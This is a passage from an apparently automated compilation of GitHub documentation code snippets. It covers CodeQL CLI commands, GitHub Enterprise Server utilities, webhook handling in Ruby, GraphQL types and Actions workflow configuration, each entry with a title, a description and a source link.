 \"ghcr.io/devcontainers-contrib/features/coverage-py:2\": {}\n  }\n\n  // Features to add to the dev container. More info: https://containers.dev/features.\n  // \"features\": {},\n\n  // Use 'forwardPorts' to make a list of ports inside the container available locally.\n  // \"forwardPorts\": [],\n\n  // Use 'postCreateCommand' to run commands after the container is created.\n  // \"postCreateCommand\": \"pip3 install --user -r requirements.txt\",\n\n  // Configure tool-specific properties.\n  // \"customizations\": {},\n\n  // Uncomment to connect as root instead. More info: https://aka.ms/dev-containers-non-root.\n  // \"remoteUser\": \"root\"\n}\n```\n\n----------------------------------------\n\nTITLE: Example Access Token Response - Shell\nDESCRIPTION: This code snippet demonstrates the default format of the access token response. It shows how the access token, scope, and token type are returned in the response body, which is typically URL-encoded. The response is typically used after exchanging the authorization code.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\naccess_token=gho_16C7e42F292c6912E7710c838347Ae178B4a&scope=repo%2Cgist&token_type=bearer\n```\n\n----------------------------------------\n\nTITLE: Docker Container Action with Public Docker Image (YAML)\nDESCRIPTION: This example configures a GitHub Action to run inside a Docker container using a public Docker image from a registry. It specifies that the action is using Docker and provides the image name.  This enables utilizing pre-built container images from sources like Docker Hub.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\nruns:\n  using: 'docker'\n  image: 'docker://debian:stretch-slim'\n```\n\n----------------------------------------\n\nTITLE: Applying Configuration Changes (ghe-config-apply)\nDESCRIPTION: This command applies the configuration changes made on the GitHub Enterprise Server. Running this command may restart services, causing brief downtime.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_27\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config-apply\n```\n\n----------------------------------------\n\nTITLE: Handling webhook deliveries in Ruby using Sinatra\nDESCRIPTION: This Ruby code uses the Sinatra framework to create a webhook endpoint at `/webhook`. It listens for POST requests, reads the `X-GitHub-Event` header to determine the event type, and processes the request body (parsed as JSON). It handles `issues` (opened/closed actions) and `ping` events, printing relevant information to the console.  Dependencies: sinatra, json (standard Ruby library).\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/handling-webhook-deliveries.md#_snippet_6\n\nLANGUAGE: Ruby\nCODE:\n```\n# These are the dependencies for this code. You installed the `sinatra` gem earlier. For more information, see [Ruby example: Install dependencies](#ruby-example-install-dependencies). The `json` library is a standard Ruby library, so you don't need to install it.\nrequire 'sinatra'\nrequire 'json'\n\n# The `/webhook` route matches the path that you specified for the smee.io forwarding. For more information, see [Forward webhooks](#forward-webhooks).\n#\n# Once you deploy your code to a server and update your webhook URL, you should change this to match the path portion of the URL for your webhook.\npost '/webhook' do\n\n  # Respond to indicate that the delivery was successfully received.\n  # Your server should respond with a 2XX response within {% ifversion fpt or ghec %}10{% else %}30{% endif %} seconds of receiving a webhook delivery. If your server takes longer than that to respond, then {% data variables.product.company_short %} terminates the connection and considers the delivery a failure.\n  status 202\n\n  # Check the `X-GitHub-Event` header to learn what event type was sent.\n  # Sinatra changes `X-GitHub-Event` to `HTTP_X_GITHUB_EVENT`.\n  github_event = request.env['HTTP_X_GITHUB_EVENT']\n\n  # You should add logic to handle each event type that your webhook is subscribed to.\n  # For example, this code handles the `issues` and `ping` events.\n  #\n  # If any events have an `action` field, you should also add logic to handle each action that you are interested in.\n  # For example, this code handles the `opened` and `closed` actions for the `issue` event.\n  #\n  # For more information about the data that you can expect for each event type, see [AUTOTITLE](/webhooks/webhook-events-and-payloads).\n  if github_event == \"issues\"\n    data = JSON.parse(request.body.read)\n    action = data['action']\n    if action == \"opened\"\n      puts \"An issue was opened with this title: #{data['issue']['title']}\"\n    elsif action == \"closed\"\n      puts \"An issue was closed by #{data['issue']['user']['login']}\"\n    else\n      puts \"Unhandled action for the issue event: #{action}\"\n    end\n  elsif github_event == \"ping\"\n    puts \"GitHub sent the ping event\"\n  else\n    puts \"Unhandled event: #{github_event}\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Fixing Empty Body in YAML Issue Form\nDESCRIPTION: This example demonstrates the \"Body cannot be empty\" error. It occurs when the body `key:value` is empty. The corrected example shows how to add a body section, or how to fix incorrect yaml by removing the document separator.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_20\n\nLANGUAGE: yaml\nCODE:\n```\nname: Support Request\ndescription: Something went wrong and you need help?\n---\nbody:\n- type: textarea\n  attributes:\n    label: \"What's wrong?\"\n```\n\nLANGUAGE: yaml\nCODE:\n```\nname: Support Request\ndescription: Something went wrong and you need help?\n\nbody:\n- type: textarea\n  attributes:\n    label: \"What's wrong?\"\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Databases for Ruby\nDESCRIPTION: This shell script demonstrates how to create a CodeQL database for Ruby code using the `codeql database create` command. It utilizes the `--language=ruby` option and a `--source-root` to define the location where the database creation is executed. No additional dependencies are explicitly required, but the correct Ruby environment should be configured.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database create --language=ruby --source-root <folder-to-extract> <output-folder>/ruby-database\n```\n\n----------------------------------------\n\nTITLE: GraphQL Signature for Repository Discussion\nDESCRIPTION: This GraphQL signature defines the structure for retrieving a specific discussion within a repository using the `discussion` field. It takes the discussion number (`number`) as an argument and returns a `Discussion` object or `null` if the discussion does not exist.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-graphql-api-for-discussions.md#_snippet_5\n\nLANGUAGE: GraphQL\nCODE:\n```\ndiscussion(number: Int!) : Discussion\n```\n\n----------------------------------------\n\nTITLE: Checking GHES License Validity\nDESCRIPTION: This command checks the validity of the current GHES license.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_85\n\nLANGUAGE: shell\nCODE:\n```\nghe-license check\n```\n\n----------------------------------------\n\nTITLE: CodeQL Database Upgrade Command\nDESCRIPTION: This command upgrades a CodeQL database to be compatible with the current tools. The database is rewritten to be compatible with the QL libraries found on the QL pack search path. Upgrading is irreversible, rendering the database unusable with older libraries.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-upgrade.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database upgrade [--threads=<num>] [--ram=<MB>] <options>... -- <database>\n```\n\n----------------------------------------\n\nTITLE: Update Git Remote URL - Shell\nDESCRIPTION: This command updates the remote URL of a local Git repository. It sets the 'origin' remote to point to the new repository URL, ensuring that future `git fetch`, `git pull`, and `git push` operations target the renamed repository. The `NEW_URL` placeholder should be replaced with the actual URL of the renamed repository.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/renaming-a-repository.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit remote set-url origin NEW_URL\n```\n\n----------------------------------------\n\nTITLE: Rendering JSON with ERB in Ruby\nDESCRIPTION: This Ruby code snippet renders an ERB template with local variables `languages` and `language_byte_count`, both converted to JSON format. This allows the data to be easily passed to the JavaScript code in the template.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/rendering-data-as-graphs.md#_snippet_12\n\nLANGUAGE: Ruby\nCODE:\n```\nerb :lang_freq, :locals => { :languages => languages.to_json, :language_byte_count => language_bytes.to_json}\n```\n\n----------------------------------------\n\nTITLE: Filtering Queries by ID - YAML\nDESCRIPTION: This example demonstrates how to exclude specific queries from a CodeQL suite based on their IDs. It excludes two queries, `cpp/cleartext-transmission` and `cpp/cleartext-storage-file`, from the `codeql/cpp-queries` suite.  The excluded queries will not be included in analysis using this suite.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\n- qlpack: codeql/cpp-queries\n- exclude:\n    id:\n      - cpp/cleartext-transmission\n      - cpp/cleartext-storage-file\n```\n\n----------------------------------------\n\nTITLE: Language Guide Template YAML Frontmatter\nDESCRIPTION: This YAML snippet provides the frontmatter structure for a language guide. It includes fields for the title, short title, introduction, product, type, topics, and versions. This frontmatter helps organize and present the language guide within the GitHub Docs ecosystem.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/templates.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\n{% raw %}---\ntitle: Guide title\nshortTitle: <subject> # Max 31 characters\nintro: 'Article intro. See tips for a great intro below'\nproduct: \"{{ optional product callout }}\"\ntype: tutorial\ntopics:\n  - <topic> # One or more from list of allowed topics: https://github.com/github/docs/blob/main/data/allowed-topics.js\nversions:\n  - <version>\n---\n{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Sending Copilot Confirmation SSE - Typescript\nDESCRIPTION: This code snippet demonstrates how to send a `copilot_confirmation` server-sent event (SSE) to the Copilot platform. This SSE is used to request user confirmation for a specific action. The data includes the action type, a title and message to display to the user, and an optional confirmation identifier.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/building-a-copilot-agent-for-your-copilot-extension/configuring-your-copilot-agent-to-communicate-with-the-copilot-platform.md#_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\n//\nevent: copilot_confirmation\ndata: {\n    // Currently, `action` is the only supported value for `type` in `copilot_confirmation`.\n    \"type\": \"action\",\n    // Title of the confirmation dialog shown to the user.\n    \"title\": \"Turn off feature flag\",\n    // Confirmation message shown to the user.\n    \"message\": \"Are you sure you wish to turn off the `copilot` feature flag?\",\n    // Optional field for the agent to include any data needed to uniquely identify this confirmation and take action once the decision is received from the client.\n    \"confirmation\": {\n        \"id\": \"id-123\",\n        \"other\": \"identifier-as-needed\",\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Enable Ed25519 Host Key - Shell\nDESCRIPTION: This command enables the generation and advertisement of the Ed25519 host key for the GitHub Enterprise Server instance.  It configures the `app.babeld.host-key-ed25519` setting to `true`.  This command must be executed via SSH on the appliance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/configuring-host-keys-for-your-instance.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.babeld.host-key-ed25519 true\n```\n\n----------------------------------------\n\nTITLE: Bamboo config file example\nDESCRIPTION: This YAML example shows the expected format for the `--config-file-path` argument to be passed to `gh actions-importer`. Each `repository_slug` must be unique.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_16\n\nLANGUAGE: YAML\nCODE:\n```\nsource_files:\n  - repository_slug: IN/COM\n    path: path/to/one/source/file.yml\n  - repository_slug: IN/JOB\n    path: path/to/another/source/file.yml\n```\n\n----------------------------------------\n\nTITLE: Adding Item to Project with GitHub CLI\nDESCRIPTION: This snippet uses the GitHub CLI to add an issue or pull request to a GitHub project. The `PROJECT_ID` placeholder needs to be replaced with the project's node ID, and `CONTENT_ID` with the issue or pull request's node ID. Requires the `gh` CLI tool to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_16\n\nLANGUAGE: Shell\nCODE:\n```\ngh api graphql -f query='\\n  mutation {\\n    addProjectV2ItemById(input: {projectId: \"PROJECT_ID\" contentId: \"CONTENT_ID\"}) {\\n      item {\\n        id\\n      }\\n    }\\n  }'\n```\n\n----------------------------------------\n\nTITLE: Accessing API with Access Token - Curl\nDESCRIPTION: This code snippet demonstrates how to make a request to the GitHub API using curl with the `Authorization` header set to the access token. It shows a practical example of using the access token to authenticate API requests.  Replacing `OAUTH-TOKEN` with the actual access token is necessary for the request to succeed.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\ncurl -H \"Authorization: Bearer OAUTH-TOKEN\" {% data variables.product.rest_url %}/user\n```\n\n----------------------------------------\n\nTITLE: Extractor Options for Go\nDESCRIPTION: CodeQL provides extractor options for Go, allowing control over which files are analyzed.  By default, test code and vendor directories are excluded, but this can be overridden with the `--extractor-option` flag in the CLI or by setting environment variables.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages.md#_snippet_10\n\n\n\n----------------------------------------\n\nTITLE: Enabling Docker-in-Docker Mode - YAML\nDESCRIPTION: This YAML snippet shows how to enable Docker-in-Docker (dind) mode in Actions Runner Controller. By setting `containerMode.type` to `dind`, ARC automatically configures the runner pod with init, runner, and dind containers.  This mode allows running Docker commands inside a container.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_22\n\nLANGUAGE: yaml\nCODE:\n```\ncontainerMode:\n  type: \"dind\"\n```\n\n----------------------------------------\n\nTITLE: Cloning GitHub Copilot Plugin for Neovim (Windows)\nDESCRIPTION: This shell command clones the GitHub Copilot plugin repository into the appropriate directory for Neovim on Windows using Git Bash. The command utilizes `git clone` to download the repository from GitHub and `$HOME` to indicate user home directory.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/installing-the-github-copilot-extension-in-your-environment.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngit clone https://github.com/github/copilot.vim.git \\\n$HOME/AppData/Local/nvim/pack/github/start/copilot.vim\n```\n\n----------------------------------------\n\nTITLE: Interpreting CodeQL database results\nDESCRIPTION: This command interprets computed query results from a CodeQL database into specified formats like SARIF or CSV. It requires the database path and the query suite or individual queries that were executed.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-interpret-results.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database interpret-results --format=<format> --output=<output> [--threads=<num>] <options>... -- <database> <file|dir|suite>...\n```\n\n----------------------------------------\n\nTITLE: Embedding Image with Light/Dark Mode Preference - HTML\nDESCRIPTION: This HTML snippet uses the <picture> element and media queries to display different images based on the user's preferred color scheme. The 'prefers-color-scheme' media query selects the appropriate image URL. The <img> tag provides a fallback image if the browser does not support the picture element.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/getting-started/picture-element-example.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<picture>\n  <source media=\"(prefers-color-scheme: dark)\" srcset=\"https://user-images.githubusercontent.com/25423296/163456776-7f95b81a-f1ed-45f7-b7ab-8fa810d529fa.png\">\n  <source media=\"(prefers-color-scheme: light)\" srcset=\"https://user-images.githubusercontent.com/25423296/163456779-a8556205-d0a5-45e2-ac17-42d089e3c3f8.png\">\n  <img alt=\"Shows an illustrated sun in light mode and a moon with stars in dark mode.\" src=\"https://user-images.githubusercontent.com/25423296/163456779-a8556205-d0a5-45e2-ac17-42d089e3c3f8.png\">\n</picture>\n```\n\n----------------------------------------\n\nTITLE: Adding Package Dependencies to pom.xml\nDESCRIPTION: This XML snippet adds a dependency to a project's `pom.xml` file to install a package from GitHub Packages. Replace `com.example` with the group ID, `test` with the artifact ID, and `1.0.0-SNAPSHOT` with the package version.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-apache-maven-registry.md#_snippet_5\n\nLANGUAGE: xml\nCODE:\n```\n<dependencies>\n    <dependency>\n       <groupId>com.example</groupId>\n       <artifactId>test</artifactId>\n       <version>1.0.0-SNAPSHOT</version>\n     </dependency>\n   </dependencies>\n```\n\n----------------------------------------\n\nTITLE: Example Output After Adding to Export\nDESCRIPTION: This snippet shows the output after adding to export. The output presents the Migration GUID, and a list of resources that will be included in the migration.  The Migration GUID is essential for later steps.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/exporting-migration-data-from-github-enterprise-server.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n> 101 models added to export\n> Migration GUID: EXAMPLE-MIGRATION-GUID\n> Number of records in this migration:\n> users                        |  5\n> organizations                |  1\n> repositories                 |  1\n> teams                        |  3\n> protected_branches           |  1\n> pull_request_reviews         |  1\n> milestones                   |  1\n> issues                       |  3\n> pull_requests                |  5\n> pull_request_review_comments |  4\n> commit_comments              |  2\n> issue_comments               | 10\n> issue_events                 | 63\n> releases                     |  3\n> attachments                  |  4\n> projects                     |  2\n```\n\n----------------------------------------\n\nTITLE: Publishing a NuGet Package\nDESCRIPTION: This command publishes a NuGet package to a specified source, using an API key for authentication. It requires the path to the `.nupkg` file, the API key (PAT), and the source URL (e.g., GitHub Packages).\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-nuget-registry.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ndotnet nuget push \"bin/Release/PROJECT_NAME.1.0.0.nupkg\" --api-key YOUR_GITHUB_PAT --source \"github\"\n```\n\n----------------------------------------\n\nTITLE: SvelteKit Server-Side Function\nDESCRIPTION: This SvelteKit server-side function fetches a runner by ID using a service. It imports a `service` module and its `getRunner` method to retrieve runner data based on the `id` parameter passed in the request. The retrieved runner is then returned as part of the `load` function's return object.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/testing-code/create-mock-objects-to-abstract-layers.md#_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\n// SvelteKit example at +page.server.ts\nimport service from './service';\n\nexport async function load({ params }) {\n  const runner = await service.getRunner(params.id);\n\n  return {\n    runner\n  };\n}\n```\n\n----------------------------------------\n\nTITLE: CodeQL Database Analysis Command\nDESCRIPTION: This command analyzes a CodeQL database by running queries and interpreting the results.  It combines the functionalities of `codeql database run-queries` and `codeql database interpret-results`. It outputs results in a specified format, such as SARIF or CSV.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-analyze.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database analyze --format=<format> --output=<output> [--threads=<num>] [--ram=<MB>] <options>... -- <database> <query|dir|suite|pack>...\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_PIPELINE_URL to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_PIPELINE_URL` to the GitHub Actions equivalent `${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}`.  Creates the URL for the pipeline's run in GitHub Actions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_35\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}\n```\n\n----------------------------------------\n\nTITLE: Building Docker Image\nDESCRIPTION: This command builds a Docker image using the `docker build` command. It tags the image with a GCR repository path, including the project ID, image name, and SHA of the GitHub commit.  Build arguments `GITHUB_SHA` and `GITHUB_REF` are passed to the build process. Assumes a Dockerfile is in the current directory.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-google-kubernetes-engine.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\ndocker build \\\n  --tag \"gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA\" \\\n  --build-arg GITHUB_SHA=\"$GITHUB_SHA\" \\\n  --build-arg GITHUB_REF=\"$GITHUB_REF\" \\\n  .\n```\n\n----------------------------------------\n\nTITLE: Checking Disk Usage with ghe-check-disk-usage - Shell\nDESCRIPTION: This snippet shows how to use the `ghe-check-disk-usage` utility to check for large files or deleted files with open file handles on the root partition of GitHub Enterprise Server.  It helps in identifying potential space issues on the root partition and requires SSH access.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nghe-check-disk-usage\n```\n\n----------------------------------------\n\nTITLE: Sending a Support Bundle with a Ticket ID (Shell)\nDESCRIPTION: Sends a support bundle to GitHub Support and associates it with a specific ticket using the `ghe-support-bundle` utility with the `-t` option.  Requires SSH access to the GitHub Enterprise Server appliance as the `admin` user. Replace `TICKET_ID` with the actual ticket ID.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_94\n\nLANGUAGE: shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME -- 'ghe-support-bundle -t TICKET_ID'\n```\n\n----------------------------------------\n\nTITLE: Editing cluster.conf with vim - Shell\nDESCRIPTION: This command demonstrates how to edit the `cluster.conf` file using `vim` on the first node of the GitHub Enterprise Server cluster. The file is located at `/data/user/common/cluster.conf`.  The `sudo` command is used to ensure that the user has the necessary permissions to create and modify the file.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/initializing-the-cluster.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nghe-data-node-1:~$ sudo vim /data/user/common/cluster.conf\n```\n\n----------------------------------------\n\nTITLE: Improved example of minimizing inline links in Markdown\nDESCRIPTION: This improved example showcases the preferred method for reducing inline links. By moving the links to the end of the sentence and preceding them with a clear introductory phrase, the readability and translatability of the content are enhanced. The AUTOTITLE tag is also used where applicable.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/writing-content-to-be-translated.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\nOAuth2 tokens can be acquired programmatically for applications that are not websites. For more information, see [AUTOTITLE](apps/building-integrations/setting-up-and-registering-oauth-apps/) and [Create a new authorization](/rest/reference/oauth-authorizations/#create-a-new-authorization).\n```\n\n----------------------------------------\n\nTITLE: Retrieving User Data with Repository Pattern\nDESCRIPTION: This Python code demonstrates how to use the `Database` context manager and `UserRepository` to retrieve user data by ID. It uses a `with` statement to manage the database connection and calls the `get_user_by_id` method of the `UserRepository` to fetch the user's display name.  Includes error checking.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/refactoring-data-access-layers.md#_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n# main.py\nfrom database import Database\nfrom user_repository import UserRepository\n\ndef get_user_by_id(user_id):\n    with Database('database.db') as db:\n        user_repo = UserRepository(db)\n        return user_repo.get_user_by_id(user_id)\n\n# Example usage\nif __name__ == \"__main__\":\n    user = get_user_by_id(1)\n    if user:\n        print(user)\n    else:\n        print(\"User not found or an error occurred.\")\n```\n\n----------------------------------------\n\nTITLE: Fork repository and clone using GitHub CLI\nDESCRIPTION: This command forks a repository and automatically clones it to the local machine using the GitHub CLI. It requires the GitHub CLI to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh repo fork REPOSITORY --clone=true\n```\n\n----------------------------------------\n\nTITLE: Executing Runner with JIT Config\nDESCRIPTION: This command executes the runner script `run.sh` and passes the encoded JIT configuration as an argument. The `--jitconfig` flag indicates that the following string is the JIT configuration. The `${encoded_jit_config}` variable should contain the JIT configuration obtained from the REST API response.\nSOURCE: https://github.com/github/docs/blob/main/content/enterprise-onboarding/github-actions-for-your-enterprise/security-hardening-for-github-actions.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\n./run.sh --jitconfig ${encoded_jit_config}\n```\n\n----------------------------------------\n\nTITLE: Configuring Maven Repository in build.gradle (Groovy)\nDESCRIPTION: This Groovy snippet configures a Maven repository named \"OSSRH\" in the `build.gradle` file.  It specifies the URL for the Maven Central Repository staging deployment and sets up credentials using environment variables for the username and password. This configuration allows Gradle to publish packages to Maven Central using the specified credentials.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-java-packages-with-gradle.md#_snippet_0\n\nLANGUAGE: groovy\nCODE:\n```\nplugins {\n  ...\n  id 'maven-publish'\n}\n\npublishing {\n  ...\n\n  repositories {\n    maven {\n      name = \"OSSRH\"\n      url = \"https://oss.sonatype.org/service/local/staging/deploy/maven2/\"\n      credentials {\n        username = System.getenv(\"MAVEN_USERNAME\")\n        password = System.getenv(\"MAVEN_PASSWORD\")\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a Method Header for Copilot Suggestion in Java\nDESCRIPTION: This Java code snippet shows a method header that triggers a code completion suggestion from GitHub Copilot.  The header `public int getDiff(int a, int b)` is typed in a Java file within Eclipse, and GitHub Copilot suggests the rest of the method's body.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_15\n\nLANGUAGE: Java\nCODE:\n```\npublic int getDiff(int a, int b)\n```\n\n----------------------------------------\n\nTITLE: Restarting resolvconf and dnsmasq Services in GHES\nDESCRIPTION: These commands restart the `resolvconf` and `dnsmasq` services after adding new nameserver entries to GitHub Enterprise Server. This ensures that the changes are applied and the system uses the updated DNS configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-network-settings/configuring-dns-nameservers.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nsudo service resolvconf restart\nsudo service dnsmasq restart\n```\n\n----------------------------------------\n\nTITLE: Defining DiscussionCategory type in GraphQL\nDESCRIPTION: Defines the `DiscussionCategory` type with fields for creation/update timestamps, description, emoji, name, and repository association. It implements the `Node` and `RepositoryNode` interfaces. It also defines whether discussions in this category support choosing an answer.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-graphql-api-for-discussions.md#_snippet_8\n\nLANGUAGE: GraphQL\nCODE:\n```\n\"\"\"\nA category for discussions in a repository.\n\"\"\"\ntype DiscussionCategory implements Node & RepositoryNode {\n  \"\"\"\n  Identifies the date and time when the object was created.\n  \"\"\"\n  createdAt: DateTime!\n\n  \"\"\"\n  A description of this category.\n  \"\"\"\n  description: String\n\n  \"\"\"\n  An emoji representing this category.\n  \"\"\"\n  emoji: String!\n\n  \"\"\"\n  This category's emoji rendered as HTML.\n  \"\"\"\n  emojiHTML: HTML!\n  id: ID!\n\n  \"\"\"\n  Whether or not discussions in this category support choosing an answer with the markDiscussionCommentAsAnswer mutation.\n  \"\"\"\n  isAnswerable: Boolean!\n\n  \"\"\"\n  The name of this category.\n  \"\"\"\n  name: String!\n\n  \"\"\"\n  The repository associated with this node.\n  \"\"\"\n  repository: Repository!\n\n  \"\"\"\n  Identifies the date and time when the object was last updated.\n  \"\"\"\n  updatedAt: DateTime!\n}\n\n```\n\n----------------------------------------\n\nTITLE: Resolve library path command\nDESCRIPTION: This shell command invokes the `codeql resolve library-path` subcommand. The command determines the QL library path and dbscheme for a specified query, directory, or root pack. It requires the CodeQL CLI to be installed and accessible in the system's PATH.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-library-path.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql resolve library-path (--query=<qlfile> | --dir=<dir> | --root-pack=<pkgname>) <options>...\n```\n\n----------------------------------------\n\nTITLE: {% data variables.product.prodname_actions %}: PostgreSQL Service Container Configuration\nDESCRIPTION: This YAML snippet configures a job in {% data variables.product.prodname_actions %} that utilizes a PostgreSQL service container. It specifies the `node:20-bookworm-slim` container image for the job and defines the `postgres` service container, including setting the `POSTGRES_PASSWORD` environment variable. It then checks out the repository code, installs dependencies, and runs a JavaScript client script to connect to and interact with the PostgreSQL database, passing the host and port as environment variables.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  container-job:\n    runs-on: ubuntu-latest\n    container: node:20-bookworm-slim\n\n    services:\n      postgres:\n        image: postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n\n    steps:\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n\n      # Performs a clean installation of all dependencies\n      # in the `package.json` file\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Connect to PostgreSQL\n        # Runs a script that creates a PostgreSQL client,\n        # populates the client with data, and retrieves data\n        run: node client.js\n        env:\n          # The hostname used to communicate with the\n          # PostgreSQL service container\n          POSTGRES_HOST: postgres\n          # The default PostgreSQL port\n          POSTGRES_PORT: 5432\n```\n\n----------------------------------------\n\nTITLE: Upgrading CodeQL pack dependencies\nDESCRIPTION: This command updates the dependencies of a CodeQL pack to the latest compatible versions. It modifies the pack's lock file with the new versions. It requires the CodeQL CLI and the path to the pack's root directory as input. The command does not take input directly via stdin.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/pack-upgrade.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql pack upgrade [--force] <options>... -- <dir>\n```\n\n----------------------------------------\n\nTITLE: SMTP Conversation Log Example\nDESCRIPTION: This shell code snippet illustrates an example of an SMTP conversation log. It displays a successful connection, TLS initiation, login authentication attempt, and a subsequent authentication 